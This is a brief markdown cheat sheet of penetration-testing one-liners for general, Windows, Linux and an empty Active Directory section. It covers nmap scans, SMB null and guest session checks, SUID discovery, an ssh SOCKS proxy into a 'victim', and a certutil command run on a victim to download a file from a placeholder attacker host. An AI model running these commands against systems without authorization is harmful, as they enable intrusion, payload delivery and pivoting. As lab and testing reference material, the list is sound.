# Oneliners

A compilation of useful oneliners.

## General:

Thorough aggressive scan of all ports with default scripts and service detection.
- `nmap -sC -sV -T4 -p- $IP`

Fast UDP scan
- `sudo nmap -sUV -F -T4 $IP`

## Windows:

Test null session (SMB port 445)
- `nxc smb $IP -u '' -p ''`

Test for guest logon (SMB port 445)
- `nxc smb $IP -u 'a' -p ''`

File transfer using certutil (Ran from victim machine)
- `certutil -urlcache -f http://<attacker_ip>/example.txt example.txt`

## Linux:

Find all `SUID` binaries.
- `find '/' 2>/dev/null -perm /4000`

List all open ports, including internal.
- `ss -tunlp`

`ssh` into victim and open a socks5 proxy.
- `ssh -D <PROXYCHAINS_PORT <USER>@<VICTIM>`

## Active Directory:
